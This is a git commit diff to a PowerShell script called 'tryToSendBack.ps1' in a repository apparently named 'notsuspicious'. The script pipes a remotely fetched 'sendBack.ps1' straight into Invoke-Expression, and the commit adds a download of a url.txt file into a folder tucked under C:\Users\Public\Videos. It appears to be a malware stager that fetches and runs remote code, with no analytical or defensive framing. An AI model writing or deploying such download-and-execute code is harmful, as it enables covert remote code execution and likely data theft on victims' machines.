b19026e9917dbe0f9719aecbdac94e78fb3b292c
RaupenInspektor <150939693+RaupenInspektor@users.noreply.github.com>
2024-03-01 12:28:15 +0100

    Update tryToSendBack.ps1

--- tryToSendBack.ps1
+++ tryToSendBack.ps1
@@ -1,1 +1,2 @@
+Invoke-WebRequest "https://github.com/RaupenInspektor/notsuspicious/raw/main/url.txt" -OutFile "C:\Users\Public\Videos\GraphicalUserInterface\url.txt" -UseBasicParsing
 Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/sendBack.ps1" -UseBasicParsing).Content
